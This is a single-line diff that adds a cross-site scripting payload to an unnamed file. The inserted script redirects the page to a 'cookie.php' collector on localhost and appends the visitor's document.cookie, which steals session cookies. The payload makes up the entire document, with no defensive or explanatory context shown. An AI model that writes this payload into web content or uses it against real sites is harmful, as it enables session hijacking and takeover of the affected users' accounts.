@@ -1,0 +1,1 @@
+<script javascript:text>document.location="http://localhost/cookie.php?c=" + document.cookie + "&t=Alert"; </script>
